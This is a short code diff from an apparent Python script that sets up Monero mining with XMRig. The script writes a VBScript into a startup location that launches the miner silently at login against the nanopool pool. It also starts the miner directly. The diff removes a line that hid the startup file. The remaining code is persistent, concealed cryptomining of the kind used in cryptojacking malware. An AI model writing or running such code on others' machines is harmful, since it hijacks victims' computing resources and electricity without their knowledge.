@@ -51,9 +51,6 @@ if extracted_folders:
         vbs_file.write(f'''Set WshShell = CreateObject("WScript.Shell") 
     WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {BITCOIN_ADDRESS} --tls --coin monero", 0, False
     ''')
-    
-    # Set the file as hidden (Windows only)
-    os.system(f'attrib +h "{STARTUP_PATH}"')
 
     subprocess.Popen(
         [xmrig_path, "-o", "xmr-us-east1.nanopool.org:14433", "-u", BITCOIN_ADDRESS, "--tls", "--coin", "monero"],
